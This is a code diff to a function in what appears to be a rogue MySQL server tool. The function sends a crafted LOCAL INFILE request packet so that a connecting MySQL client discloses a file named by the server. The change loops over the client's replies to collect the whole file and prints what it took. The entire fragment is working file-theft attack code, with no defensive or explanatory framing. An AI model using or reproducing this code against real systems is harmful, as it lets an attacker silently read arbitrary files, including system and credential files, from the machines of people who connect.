@@ -43,8 +43,14 @@ def mysql_get_file_content(filename,conn,address):
             try:
                 wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
                 conn.sendall(wantfile)
-                content = conn.recv(99999999)
+                conn.sendall('deadbeafdeadbeaf')
+                content = 'deadbeaf'
+                text = ''
+                while len(content) != 0:
+                    content = conn.recv(99999999)
+                    text += content
                 # print(len(content))
+                print(text)
                 conn.close()
                 if len(content) > 4:
                     if 'PFRO' in filename:
